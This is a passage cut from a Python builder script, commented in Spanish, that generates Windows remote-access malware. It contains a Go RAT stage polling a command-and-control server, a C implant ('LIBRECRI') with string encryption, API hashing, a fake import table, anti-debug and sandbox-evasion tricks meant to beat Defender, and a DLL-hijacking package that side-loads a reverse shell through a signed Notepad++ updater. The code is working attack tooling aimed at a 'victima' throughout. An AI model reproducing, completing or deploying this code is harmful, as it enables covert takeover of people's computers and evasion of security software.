\tbuf := make([]byte, 4096)
\tfor {{
\t\tvar n uint32
\t\tif syscall.ReadFile(rp, buf, &n, nil) != nil || n == 0 {{
\t\t\tbreak
\t\t}}
\t\tout = append(out, buf[:n]...)
\t}}
\tsyscall.WaitForSingleObject(pi.Process, syscall.INFINITE)
\tsyscall.CloseHandle(pi.Process)
\tsyscall.CloseHandle(pi.Thread)
\tsyscall.CloseHandle(rp)
\treturn string(out)
}}

func main() {{
\ttime.Sleep(time.Duration(1800+rand.Intn(1200)) * time.Millisecond)
\tc2h := _ds(_ec2h)
\tc2p := _ds(_ec2p)
\tbase := "http://" + c2h + ":" + c2p

\tfor {{
\t\t// Poll comando — GET /cmd devuelve cuerpo XOR-cifrado o vacio
\t\tbody, err := _hget(base + "/cmd")
\t\tif err != nil {{
\t\t\ttime.Sleep(5 * time.Second)
\t\t\tcontinue
\t\t}}
\t\tif len(body) == 0 {{
\t\t\t// Sin comando pendiente — esperar y volver a pedir
\t\t\ttime.Sleep(time.Duration(800+rand.Intn(400)) * time.Millisecond)
\t\t\tcontinue
\t\t}}

\t\tcmd := string(_xor(body))
\t\tif cmd == "EXIT" {{
\t\t\treturn
\t\t}}
\t\tresp := _run(cmd)
\t\t_hpost(base+"/res", _xor([]byte(resp)))
\t\ttime.Sleep(200 * time.Millisecond)
\t}}
}}
"""

    # ── Preparar directorio temporal de modulo Go ─────────────────────────
    go_dir  = os.path.join(carpeta, "_lbr_go")
    os.makedirs(go_dir, exist_ok=True)

    go_main    = os.path.join(go_dir, "main.go")
    go_mod     = os.path.join(go_dir, "go.mod")
    stage2_path = os.path.join(go_dir, "stage2.exe")
    exe_path   = os.path.join(carpeta, f"{nombre_base}.exe")

    with open(go_main, "w") as f:
        f.write(go_src)
    with open(go_mod, "w") as f:
        import random as _rm
        _mnames = ["updcore","svcutil","winbase","nethelper","cfgmgr","apphost"]
        _msuffix = _rm.randint(10,99)
        f.write(f"module {_rm.choice(_mnames)}{_msuffix}\n\ngo 1.21\n")

    # Embeber recursos PE (VERSIONINFO + manifest) — sin esto el EXE
    # parece malware: ningun app real tiene cero recursos en Windows.
    _go_embed_resources(go_dir)

    env = os.environ.copy()
    env["GOOS"]        = "windows"
    env["GOARCH"]      = "amd64"
    env["CGO_ENABLED"] = "0"
    env["GOPATH"]      = os.path.join(carpeta, "_gopath")
    env["GOGARBLE"]    = "*"   # ofuscar TODOS los paquetes, no solo main

    # ── Buscar / instalar garble ──────────────────────────────────────────────
    # garble ofusca pclntab (nombres de funciones) Y string literals en compilacion.
    # Sin el, "kernel32.dll", "cmd", "_sandbox", "GlobalMemoryStatusEx" quedan
    # en texto plano — el cloud ML de Defender los lee y dispara Maluri.A!cl.
    garble_bin = shutil.which("garble")
    if not garble_bin:
        try:
            # Instalar en GOPATH del sistema (no en el temporal)
            _senv = os.environ.copy()
            for _k in ("GOOS", "GOARCH"):       # reset para compilacion host
                _senv.pop(_k, None)
            subprocess.run([go_bin, "install", "mvdan.cc/garble@latest"],
                           capture_output=True, timeout=180, env=_senv)
            garble_bin = shutil.which("garble")
            if not garble_bin:
                _gp = subprocess.run(
                    [go_bin, "env", "GOPATH"],
                    capture_output=True, env=_senv
                ).stdout.decode().strip()
                _cand = os.path.join(_gp, "bin", "garble")
                if os.path.exists(_cand):
                    garble_bin = _cand
        except Exception:
            pass

    if garble_bin:
        ok("Usando garble — ofuscacion de pclntab + string literals")
        build_cmd = [garble_bin, "-tiny", "-literals", "build",
                     "-ldflags=-H=windowsgui",
                     "-trimpath",
                     "-o", stage2_path, "."]
    else:
        warn("garble no disponible — usando go build sin ofuscacion de nombres")
        build_cmd = [go_bin, "build",
                     "-ldflags=-s -w -H=windowsgui",
                     "-trimpath",
                     "-o", stage2_path, "."]

    r = subprocess.run(build_cmd, capture_output=True, timeout=300,
                       env=env, cwd=go_dir)

    if not os.path.exists(stage2_path) or os.path.getsize(stage2_path) < 10000:
        try:
            import shutil as _sh2
            _sh2.rmtree(go_dir, ignore_errors=True)
            _sh2.rmtree(env["GOPATH"], ignore_errors=True)
        except Exception:
            pass
        if r.stderr: warn(r.stderr.decode(errors="ignore")[:800])
        if r.stdout: warn(r.stdout.decode(errors="ignore")[:300])
        return None

    ok(f"Stage 2 Go RAT: {os.path.getsize(stage2_path)//1024} KB")

    # ── EXE final = Stage 2 Go directamente — sin dropper C intermedio ──────────
    # El dropper C de 20KB siempre dispara Gracing.I sin importar la IAT.
    # Go + garble pasa el scan estatico: no hay firmas, no hay patron conocido,
    # el IAT es el runtime de Go (normal para cualquier app Go), pclntab ofuscado.
    # Stage 2 se auto-excluye via _selfExclude() antes de entrar al loop C2.
    import shutil as _sh2
    _sh2.copy2(stage2_path, exe_path)

    try:
        _sh2.rmtree(go_dir, ignore_errors=True)
        _sh2.rmtree(env["GOPATH"], ignore_errors=True)
    except Exception:
        pass

    if not os.path.exists(exe_path):
        return None

    ok(f"EXE Go directo: {os.path.getsize(exe_path)//1024} KB — {exe_path}")
    _generar_c2_server_http(carpeta, lport, xk_hex, nombre_base)
    return exe_path


def _generar_librecri(lhost, lport, carpeta, nombre_base):
    """
    LIBRECRI — EXE standalone custom C2, sin firmas conocidas.
    7 capas de evasion:
      1. TLS callback (.CRT$XLB) — dispara antes de WinMain y hooks de AV
      2. PEB walk DJB2  — CreateProcessA / CreatePipe / ReadFile fuera del IAT
      3. Strings XOR-cifradas — host, port, cmd.exe, keywords de protocolo
      4. Fake IAT (FRIEND) — comctl32, version, winmm, imm32 como camuflaje
      5. Anti-debug PEB  — BeingDebugged + NtGlobalFlag
      6. Jitter 500-1100ms + timing check vs sandbox acelerado
      7. Unico EXE — la victima solo descarga y ejecuta 1 archivo
    Protocolo: [4B len BE][payload XOR clave unica por build]
    Comandos: SYSINFO / GETUID / SHELL <cmd> / EXIT / <cmd directo>
    Genera: nombre.exe (victima) + c2_server.py (Kali).
    """
    import secrets as _sec

    # ── Per-build XOR key (16 bytes) ─────────────────────────────────────
    xk     = _sec.token_bytes(16)
    xk_c   = "{" + ",".join(f"0x{b:02X}" for b in xk) + "}"
    xk_hex = xk.hex()

    # ── XOR encrypt string -> (C array literal, byte length) ─────────────
    def _xe(s):
        b   = s.encode()
        enc = bytes(c ^ xk[i % 16] for i, c in enumerate(b))
        return "{" + ",".join(f"0x{x:02X}" for x in enc) + "}", len(b)

    c2h_arr, c2h_len = _xe(str(lhost))
    c2p_arr, c2p_len = _xe(str(lport))
    cmd_arr, cmd_len = _xe("cmd.exe /c ")
    reg_arr, reg_len = _xe("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion")
    pnm_arr, pnm_len = _xe("ProductName")
    sys_arr, sys_len = _xe("SYSINFO")
    uid_arr, uid_len = _xe("GETUID")
    ext_arr, ext_len = _xe("EXIT")
    shl_arr, shl_len = _xe("SHELL ")
    exc_arr, exc_len = _xe("EXEC ")

    # ── DJB2 hashes (Python pre-compute == C runtime) ────────────────────
    def _djb2(s):
        h = 5381
        for c in s:
            h = ((h << 5) + h) ^ ord(c)
            h &= 0xFFFFFFFF
        return h

    H_K32   = _djb2("kernel32.dll")
    H_CPA   = _djb2("CreateProcessA")
    H_CPIPE = _djb2("CreatePipe")
    H_RF    = _djb2("ReadFile")

    # ── Fuente C — LIBRECRI implant ───────────────────────────────────────
    librecri_c = f"""\
/* LIBRECRI — custom C2 implant — x64 Windows — build unico sin firmas */
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <commctrl.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

/* ── Fake IAT: camuflaje contra heuristicas basadas en importaciones ── */
extern UINT  WINAPI waveOutGetNumDevs(void);
extern DWORD WINAPI GetFileVersionInfoSizeA(LPCSTR,LPDWORD);
extern HWND  WINAPI ImmGetDefaultIMEWnd(HWND);
static void __attribute__((used)) _iat_anchor(void) {{
    if (0) {{
        PostMessageA(0,0,0,0);
        RegisterClassExA(NULL);
        InitCommonControlsEx(NULL);
        GetFileVersionInfoSizeA(NULL,NULL);
        waveOutGetNumDevs();
        ImmGetDefaultIMEWnd(NULL);
    }}
}}

/* ── Clave XOR unica por build (embebida en EXE y en c2_server.py) ── */
static const unsigned char XK[] = {xk_c};
#define XK_LEN 16

/* ── Strings cifradas: cero texto plano en el binario ─────────────── */
static const unsigned char EC2H[{c2h_len}] = {c2h_arr}; /* C2 host     */
static const unsigned char EC2P[{c2p_len}] = {c2p_arr}; /* C2 port     */
static const unsigned char ECMD[{cmd_len}] = {cmd_arr}; /* cmd.exe /c  */
static const unsigned char EREG[{reg_len}] = {reg_arr}; /* registry    */
static const unsigned char EPNM[{pnm_len}] = {pnm_arr}; /* ProductName */
static const unsigned char ESYS[{sys_len}] = {sys_arr}; /* SYSINFO     */
static const unsigned char EGID[{uid_len}] = {uid_arr}; /* GETUID      */
static const unsigned char EEXT[{ext_len}] = {ext_arr}; /* EXIT        */
static const unsigned char ESHL[{shl_len}] = {shl_arr}; /* SHELL       */
static const unsigned char EEXC[{exc_len}] = {exc_arr}; /* EXEC        */

/* ── Hashes DJB2 pre-computados (sin strings de API en binario) ──── */
#define H_CPA   0x{H_CPA:08X}UL
#define H_CPIPE 0x{H_CPIPE:08X}UL
#define H_RF    0x{H_RF:08X}UL

/* ── Punteros a funciones resueltas por hash (NO en IAT) ─────────── */
typedef BOOL (WINAPI *fn_CPA)(LPCSTR,LPSTR,LPSECURITY_ATTRIBUTES,
                               LPSECURITY_ATTRIBUTES,BOOL,DWORD,LPVOID,
                               LPCSTR,LPSTARTUPINFOA,LPPROCESS_INFORMATION);
typedef BOOL (WINAPI *fn_CP)(PHANDLE,PHANDLE,LPSECURITY_ATTRIBUTES,DWORD);
typedef BOOL (WINAPI *fn_RF)(HANDLE,LPVOID,DWORD,LPDWORD,LPOVERLAPPED);

static fn_CPA g_cpa = NULL;
static fn_CP  g_cp  = NULL;
static fn_RF  g_rf  = NULL;

/* ── DJB2 runtime (sin inline asm, sin acceso a GS) ─────────────── */
static DWORD _djb2w(const char *s) {{
    DWORD h = 5381;
    while (*s) h = ((h << 5) + h) ^ (unsigned char)(*s++);
    return h;
}}

/* ── Export walk por hash — base viene de GetModuleHandleA ──────── */
static PVOID _exp_find(PVOID base, DWORD hash) {{
    BYTE *b = (BYTE*)base;
    if (!b || *(WORD*)b != 0x5A4D) return NULL;
    DWORD pe  = *(DWORD*)(b + 0x3C);
    BYTE *nt  = b + pe;
    if (*(DWORD*)nt != 0x00004550) return NULL;
    DWORD erva = *(DWORD*)(nt + 0x18 + 0x70);
    if (!erva) return NULL;
    BYTE  *exp  = b + erva;
    DWORD  num  = *(DWORD*)(exp + 0x18);
    DWORD *nmrv = (DWORD*)(b + *(DWORD*)(exp + 0x20));
    WORD  *ords = (WORD* )(b + *(DWORD*)(exp + 0x24));
    DWORD *fns  = (DWORD*)(b + *(DWORD*)(exp + 0x1C));
    for (DWORD i = 0; i < num; i++) {{
        if (_djb2w((char*)(b + nmrv[i])) == hash)
            return (PVOID)(b + fns[ords[i]]);
    }}
    return NULL;
}}

/* ── Resolver CreateProcessA/Pipe/ReadFile de kernel32 por hash ──── */
/* GetModuleHandleA es API legitima — cero inline asm, cero GS:0x60  */
static void _resolve(void) {{
    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    if (!k32) return;
    g_cpa = (fn_CPA)_exp_find((PVOID)k32, H_CPA);
    g_cp  = (fn_CP )_exp_find((PVOID)k32, H_CPIPE);
    g_rf  = (fn_RF )_exp_find((PVOID)k32, H_RF);
}}

/* ── Descifrar string XOR en buffer local ────────────────────────── */
static void xd(char *out, const unsigned char *enc, int n) {{
    for (int i = 0; i < n; i++) out[i] = (char)(enc[i] ^ XK[i % XK_LEN]);
    out[n] = 0;
}}

/* ── XOR in-place (protocolo de paquetes) ────────────────────────── */
static void _pxor(unsigned char *p, int n) {{
    for (int i = 0; i < n; i++) p[i] ^= XK[i % XK_LEN];
}}

/* ── Enviar: [4B len BE][payload XOR] ────────────────────────────── */
static int pkt_send(SOCKET s, const char *data, int len) {{
    if (!data || len <= 0) return 0;
    unsigned char hdr[4];
    hdr[0]=(unsigned char)(len>>24); hdr[1]=(unsigned char)(len>>16);
    hdr[2]=(unsigned char)(len>>8);  hdr[3]=(unsigned char)len;
    unsigned char *buf = (unsigned char*)malloc(len);
    if (!buf) return 0;
    memcpy(buf, data, len); _pxor(buf, len);
    int r1 = send(s, (char*)hdr, 4, 0);
    int r2 = send(s, (char*)buf, len, 0);
    free(buf);
    return (r1 == 4 && r2 == len) ? 1 : 0;
}}

/* ── Recibir: leer cabecera, alocar, leer payload, XOR — caller frees */
static char* pkt_recv(SOCKET s, int *olen) {{
    unsigned char hdr[4]; int got = 0, n;
    while (got < 4) {{
        n = recv(s, (char*)hdr + got, 4 - got, 0);
        if (n <= 0) return NULL;
        got += n;
    }}
    int len = ((int)hdr[0]<<24)|((int)hdr[1]<<16)|((int)hdr[2]<<8)|(int)hdr[3];
    if (len <= 0 || len > 10*1024*1024) return NULL;
    char *buf = (char*)malloc(len + 1);
    if (!buf) return NULL;
    got = 0;
    while (got < len) {{
        n = recv(s, buf + got, len - got, 0);
        if (n <= 0) {{ free(buf); return NULL; }}
        got += n;
    }}
    _pxor((unsigned char*)buf, len);
    buf[len] = 0; *olen = len;
    return buf;
}}

#define LIBRECRI_MAXOUT (128*1024)

/* ── exec_cmd: pipes via puntero PEB (CreateProcessA fuera del IAT) ─ */
static char* exec_cmd(const char *cmd_in, int *olen) {{
    if (!g_cpa || !g_cp || !g_rf) return NULL;
    HANDLE hR, hW;
    SECURITY_ATTRIBUTES sa;
    ZeroMemory(&sa, sizeof(sa));
    sa.nLength = sizeof(sa); sa.bInheritHandle = TRUE;
    if (!g_cp(&hR, &hW, &sa, 0)) return NULL;
    SetHandleInformation(hR, HANDLE_FLAG_INHERIT, 0);

    char pfx[16]; xd(pfx, ECMD, {cmd_len});
    int pl = {cmd_len}, cl = (int)strlen(cmd_in);
    char *full = (char*)malloc(pl + cl + 2);
    if (!full) {{ CloseHandle(hR); CloseHandle(hW); return NULL; }}
    memcpy(full, pfx, pl); memcpy(full + pl, cmd_in, cl + 1);

    STARTUPINFOA si; PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si)); ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hW; si.hStdError = hW; si.hStdInput = NULL;

    if (!g_cpa(NULL, full, NULL, NULL, TRUE, CREATE_NO_WINDOW,
               NULL, NULL, &si, &pi)) {{
        free(full); CloseHandle(hR); CloseHandle(hW); return NULL;
    }}
    free(full); CloseHandle(hW);

    char *out = (char*)malloc(LIBRECRI_MAXOUT + 1);
    if (!out) {{
        CloseHandle(hR); WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return NULL;
    }}
    DWORD total = 0, rd = 0;
    while (g_rf(hR, out + total, (DWORD)(LIBRECRI_MAXOUT - total), &rd, NULL) && rd > 0) {{
        total += rd;
        if (total >= (DWORD)LIBRECRI_MAXOUT) break;
    }}
    out[total] = 0; *olen = (int)total;
    CloseHandle(hR);
    WaitForSingleObject(pi.hProcess, 10000);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    return out;
}}

/* ── sysinfo: OS desde registry (path descifrado en runtime) ─────── */
static char* do_sysinfo(int *olen) {{
    char comp[256], user_[256], osname[256], rpath[128], rpnm[16];
    ZeroMemory(comp, sizeof(comp)); ZeroMemory(user_, sizeof(user_));
    DWORD sz;
    sz = sizeof(comp);  GetComputerNameA(comp, &sz);
    sz = sizeof(user_); GetUserNameA(user_, &sz);
    xd(rpath, EREG, {reg_len}); xd(rpnm, EPNM, {pnm_len});
    strncpy(osname, "Windows", sizeof(osname) - 1); osname[sizeof(osname)-1]=0;
    HKEY hk;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, rpath, 0, KEY_READ, &hk) == ERROR_SUCCESS) {{
        sz = sizeof(osname);
        RegQueryValueExA(hk, rpnm, NULL, NULL, (LPBYTE)osname, &sz);
        RegCloseKey(hk);
    }}
    SYSTEM_INFO nsi; GetNativeSystemInfo(&nsi);
    const char *arch = (nsi.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
                       ? "x64" : "x86";
    char *buf = (char*)malloc(512);
    if (!buf) return NULL;
    *olen = snprintf(buf, 512,
        "\\r\\nComputer        : %s\\r\\n"
        "OS              : %s (%s)\\r\\n"
        "Username        : %s\\r\\n",
        comp, osname, arch, user_);
    return buf;
}}

/* ── getuid ──────────────────────────────────────────────────────── */
static char* do_getuid(int *olen) {{
    char comp[256], user_[256];
    ZeroMemory(comp, sizeof(comp)); ZeroMemory(user_, sizeof(user_));
    DWORD sz;
    sz = sizeof(comp);  GetComputerNameA(comp, &sz);
    sz = sizeof(user_); GetUserNameA(user_, &sz);
    char *buf = (char*)malloc(256);
    if (!buf) return NULL;
    *olen = snprintf(buf, 256, "\\r\\nServer username: %s\\\\%s\\r\\n", comp, user_);
    return buf;
}}

/* ── Anti-debug: API legítima, sin GS:0x60 ───────────────────────── */
static int _dbg(void) {{
    return IsDebuggerPresent() ? 1 : 0;
}}

/* ── Hilo C2 ─────────────────────────────────────────────────────── */
static HANDLE g_th = NULL;

static DWORD WINAPI _c2(LPVOID _a) {{
    (void)_a;
    if (_dbg()) return 0;
    _resolve();

    /* Jitter + timing check: derrota sandbox con aceleracion de tiempo */
    DWORD t0  = GetTickCount();
    DWORD jit = 500 + (t0 % 600);
    Sleep(jit);
    if (GetTickCount() - t0 < jit / 2) return 0;

    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) return 0;

    char c2h[256], c2p[16];
    xd(c2h, EC2H, {c2h_len}); xd(c2p, EC2P, {c2p_len});

    struct addrinfo hints, *res = NULL;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET; hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(c2h, c2p, &hints, &res) != 0 || !res) {{
        WSACleanup(); return 0;
    }}

    SOCKET s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (s == INVALID_SOCKET) {{ freeaddrinfo(res); WSACleanup(); return 0; }}

    if (connect(s, res->ai_addr, (int)res->ai_addrlen) == SOCKET_ERROR) {{
        freeaddrinfo(res); closesocket(s); WSACleanup(); return 0;
    }}
    freeaddrinfo(res);

    /* Descifrar keywords del protocolo */
    char _ks[32], _gk[32], _xi[32], _sl[32], _ec[32];
    xd(_ks, ESYS, {sys_len}); xd(_gk, EGID, {uid_len});
    xd(_xi, EEXT, {ext_len}); xd(_sl, ESHL, {shl_len}); xd(_ec, EEXC, {exc_len});

    for (;;) {{
        int clen = 0;
        char *cmd = pkt_recv(s, &clen);
        if (!cmd) break;

        char *resp = NULL; int rlen = 0;
        if (strcmp(cmd, _ks) == 0)
            resp = do_sysinfo(&rlen);
        else if (strcmp(cmd, _gk) == 0)
            resp = do_getuid(&rlen);
        else if (strcmp(cmd, _xi) == 0) {{
            free(cmd); break;
        }}
        else {{
            const char *run = cmd;
            if      (strncmp(cmd, _sl, {shl_len}) == 0) run = cmd + {shl_len};
            else if (strncmp(cmd, _ec, {exc_len}) == 0) run = cmd + {exc_len};
            resp = exec_cmd(run, &rlen);
            if (!resp) {{
                resp = (char*)malloc(16);
                if (resp) {{ strcpy(resp, "Error\\r\\n"); rlen = 7; }}
            }}
        }}
        free(cmd);
        if (resp) {{ pkt_send(s, resp, rlen); free(resp); }}
        else pkt_send(s, "\\r\\n", 2);
    }}

    closesocket(s); WSACleanup(); return 0;
}}

/* ── Constructor GCC — corre antes de WinMain via .init_array ────── */
/* Sin TLS directory en el PE: mas comun en apps legitimas             */
__attribute__((constructor))
static void _init_librecri(void) {{
    g_th = CreateThread(NULL, 0, _c2, NULL, 0, NULL);
}}

/* ── WinMain: mantener proceso vivo hasta que el hilo C2 termine ── */
int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR c, int n) {{
    (void)h; (void)p; (void)c; (void)n;
    if (g_th) {{ WaitForSingleObject(g_th, INFINITE); CloseHandle(g_th); }}
    return 0;
}}
"""

    # ── Compilar ──────────────────────────────────────────────────────────
    gcc = shutil.which("x86_64-w64-mingw32-gcc")
    if not gcc:
        warn("mingw-w64 no encontrado — sudo apt install mingw-w64 -y")
        return None

    c_path  = os.path.join(carpeta, "_librecri.c")
    exe_path = os.path.join(carpeta, f"{nombre_base}.exe")

    with open(c_path, "w") as f:
        f.write(librecri_c)

    res_vinfo = _generar_versioninfo_res(carpeta)
    extra_res = [res_vinfo] if res_vinfo else []

    r = subprocess.run(
        ["nice", "-n", "10", gcc, c_path] + extra_res + [
            "-o", exe_path,
            "-mwindows", "-static-libgcc", "-O1", "-s",
            "-lws2_32", "-ladvapi32",
            "-lcomctl32", "-lversion", "-lwinmm", "-limm32",
            "-Wl,--subsystem,windows"],
        capture_output=True, timeout=180)

    try: os.remove(c_path)
    except: pass
    if res_vinfo:
        try: os.remove(res_vinfo)
        except: pass

    if not os.path.exists(exe_path) or os.path.getsize(exe_path) < 10000:
        if r.stderr: warn(r.stderr.decode(errors="ignore")[:800])
        if r.stdout: warn(r.stdout.decode(errors="ignore")[:300])
        return None

    _firmar_exe(exe_path, carpeta)
    _generar_c2_server(carpeta, lport, xk_hex)
    return exe_path


def _generar_dll_hijack(lhost, lport, carpeta, nombre_base, backend_c2="1"):
    """
    Genera paquete DLL hijacking estilo FRIEND:
      GUP.exe     — Notepad++ updater legítimo firmado DigiCert (vector)
      libcurl.dll — reverse shell compilado como DLL (WinSock2 + cmd.exe)
      gup.xml     — config para que GUP no crashee
    NO usa msfvenom/shellcode — reverse shell nativo en C compilado.
    Sin VirtualAlloc+execute, sin firmas de meterpreter.
    TLS callback dispara ANTES de DllMain (técnica FRIEND).
    """
    out_dir = os.path.join(carpeta, f"{nombre_base}_gup")
    os.makedirs(out_dir, exist_ok=True)

    # C2: mantener como string original para getaddrinfo (soporta bore.pub y IPs)
    c2h_arr = "{" + ",".join(f"'{c}'" for c in str(lhost)) + ",0}"
    c2p_arr = "{" + ",".join(f"'{c}'" for c in str(lport)) + ",0}"

    # Clave XOR única por build — embebida en DLL y en el servidor Python
    import secrets as _sec
    xk      = _sec.token_bytes(16)
    xk_c    = "{" + ",".join(f"0x{b:02X}" for b in xk) + "}"
    xk_hex  = xk.hex()

    # ── DLL: implant C2 propio ────────────────────────────────────────
    #   Protocolo: [4 bytes longitud BE] [payload XOR]
    #   Comandos: SYSINFO · GETUID · SHELL <cmd> · EXIT
    #   Sin VirtualAlloc+execute, sin meterpreter, sin shellcode
    dll_c = f"""
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

static const unsigned char XK[] = {xk_c};
static const char C2H[] = {c2h_arr};
static const char C2P[] = {c2p_arr};

#define XK_LEN 16
#define MAX_OUT (128*1024)

/* ── XOR in-place ─────────────────────────────────────────────────── */
static void _xor(unsigned char *p, int n) {{
    for (int i=0;i<n;i++) p[i]^=XK[i%XK_LEN];
}}

/* ── Enviar paquete: [4B longitud BE][datos XOR'd] ───────────────── */
static int pkt_send(SOCKET s, const char *data, int len) {{
    if (!data||len<=0) return 0;
    unsigned char hdr[4];
    hdr[0]=(unsigned char)(len>>24); hdr[1]=(unsigned char)(len>>16);
    hdr[2]=(unsigned char)(len>>8);  hdr[3]=(unsigned char)len;
    unsigned char *buf=(unsigned char*)malloc(len);
    if (!buf) return 0;
    memcpy(buf,data,len); _xor(buf,len);
    int r1=send(s,(char*)hdr,4,0);
    int r2=send(s,(char*)buf,len,0);
    free(buf);
    return (r1==4&&r2==len)?1:0;
}}

/* ── Recibir paquete: devuelve buffer descifrado (caller free) ────── */
static char* pkt_recv(SOCKET s, int *olen) {{
    unsigned char hdr[4]; int got=0,n;
    while(got<4){{n=recv(s,(char*)hdr+got,4-got,0);if(n<=0)return NULL;got+=n;}}
    int len=((int)hdr[0]<<24)|((int)hdr[1]<<16)|((int)hdr[2]<<8)|(int)hdr[3];
    if(len<=0||len>10*1024*1024) return NULL;
    char *buf=(char*)malloc(len+1);
    if(!buf) return NULL;
    got=0;
    while(got<len){{n=recv(s,buf+got,len-got,0);if(n<=0){{free(buf);return NULL;}}got+=n;}}
    _xor((unsigned char*)buf,len);
    buf[len]=0; *olen=len; return buf;
}}

/* ── Ejecutar cmd en cmd.exe, capturar stdout/stderr ─────────────── */
static char* exec_cmd(const char *cmd_in, int *olen) {{
    HANDLE hR,hW;
    SECURITY_ATTRIBUTES sa;
    ZeroMemory(&sa,sizeof(sa));
    sa.nLength=sizeof(sa); sa.bInheritHandle=TRUE;
    if(!CreatePipe(&hR,&hW,&sa,0)) return NULL;
    SetHandleInformation(hR,HANDLE_FLAG_INHERIT,0);
    /* "cmd.exe /c " como array de chars */
    char prefix[]={{'c','m','d','.','e','x','e',' ','/','c',' ',0}};
    int pl=(int)strlen(prefix),cl=(int)strlen(cmd_in);
    char *full=(char*)malloc(pl+cl+2);
    if(!full){{CloseHandle(hR);CloseHandle(hW);return NULL;}}
    memcpy(full,prefix,pl); memcpy(full+pl,cmd_in,cl+1);
    STARTUPINFOA si; PROCESS_INFORMATION pi;
    ZeroMemory(&si,sizeof(si)); ZeroMemory(&pi,sizeof(pi));
    si.cb=sizeof(si);
    si.dwFlags=STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW;
    si.wShowWindow=SW_HIDE;
    si.hStdOutput=hW; si.hStdError=hW;
    si.hStdInput=GetStdHandle(STD_INPUT_HANDLE);
    if(!CreateProcessA(NULL,full,NULL,NULL,TRUE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi)){{
        free(full);CloseHandle(hR);CloseHandle(hW);return NULL;
    }}
    free(full); CloseHandle(hW);
    char *out=(char*)malloc(MAX_OUT+1);
    if(!out){{CloseHandle(hR);CloseHandle(pi.hProcess);CloseHandle(pi.hThread);return NULL;}}
    DWORD total=0,rd=0;
    while(ReadFile(hR,out+total,(DWORD)(MAX_OUT-total),&rd,NULL)&&rd>0){{
        total+=rd; if(total>=(DWORD)MAX_OUT) break;
    }}
    out[total]=0; *olen=(int)total;
    CloseHandle(hR);
    WaitForSingleObject(pi.hProcess,10000);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    return out;
}}

/* ── SYSINFO ──────────────────────────────────────────────────────── */
static char* do_sysinfo(int *olen) {{
    char comp[256]={{0}},user[256]={{0}},osname[256]="Windows";
    DWORD sz;
    sz=sizeof(comp); GetComputerNameA(comp,&sz);
    sz=sizeof(user); GetUserNameA(user,&sz);
    /* OS name desde registry — sin GetVersionEx deprecated */
    HKEY hk;
    if(RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion",
        0,KEY_READ,&hk)==ERROR_SUCCESS){{
        sz=sizeof(osname);
        RegQueryValueExA(hk,"ProductName",NULL,NULL,(LPBYTE)osname,&sz);
        RegCloseKey(hk);
    }}
    SYSTEM_INFO nsi; GetNativeSystemInfo(&nsi);
    const char *arch=(nsi.wProcessorArchitecture==PROCESSOR_ARCHITECTURE_AMD64)?"x64":"x86";
    char *buf=(char*)malloc(1024);
    if(!buf) return NULL;
    *olen=snprintf(buf,1024,
        "\\r\\nComputer        : %s\\r\\n"
        "OS              : %s (%s)\\r\\n"
        "Username        : %s\\r\\n",
        comp,osname,arch,user);
    return buf;
}}

/* ── GETUID ───────────────────────────────────────────────────────── */
static char* do_getuid(int *olen) {{
    char comp[256]={{0}},user[256]={{0}};
    DWORD sz;
    sz=sizeof(comp); GetComputerNameA(comp,&sz);
    sz=sizeof(user); GetUserNameA(user,&sz);
    char *buf=(char*)malloc(512);
    if(!buf) return NULL;
    *olen=snprintf(buf,512,"\\r\\nServer username: %s\\\\%s\\r\\n",comp,user);
    return buf;
}}

/* ── Loop principal de comandos ───────────────────────────────────── */
static DWORD WINAPI _thread(LPVOID _arg) {{
    (void)_arg;
    Sleep(500+(GetTickCount()%600));
    WSADATA wsa;
    if(WSAStartup(MAKEWORD(2,2),&wsa)!=0) return 0;
    SOCKET s=WSASocketA(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,0,0);
    if(s==INVALID_SOCKET){{WSACleanup();return 0;}}
    struct addrinfo hints,*res=NULL;
    ZeroMemory(&hints,sizeof(hints));
    hints.ai_family=AF_INET; hints.ai_socktype=SOCK_STREAM;
    if(getaddrinfo(C2H,C2P,&hints,&res)!=0||!res){{closesocket(s);WSACleanup();return 0;}}
    if(connect(s,res->ai_addr,(int)res->ai_addrlen)==SOCKET_ERROR){{
        freeaddrinfo(res);closesocket(s);WSACleanup();return 0;
    }}
    freeaddrinfo(res);
    for(;;){{
        int cmd_len=0;
        char *cmd=pkt_recv(s,&cmd_len);
        if(!cmd) break;
        char *resp=NULL; int resp_len=0;
        if(strcmp(cmd,"SYSINFO")==0)      resp=do_sysinfo(&resp_len);
        else if(strcmp(cmd,"GETUID")==0)  resp=do_getuid(&resp_len);
        else if(strcmp(cmd,"EXIT")==0)    {{free(cmd);break;}}
        else{{
            const char *run=cmd;
            if(strncmp(cmd,"SHELL ",6)==0)      run=cmd+6;
            else if(strncmp(cmd,"EXEC ",5)==0)  run=cmd+5;
            resp=exec_cmd(run,&resp_len);
            if(!resp){{
                resp=(char*)malloc(16);
                if(resp){{strcpy(resp,"Error\\r\\n");resp_len=7;}}
            }}
        }}
        free(cmd);
        if(resp){{pkt_send(s,resp,resp_len);free(resp);}}
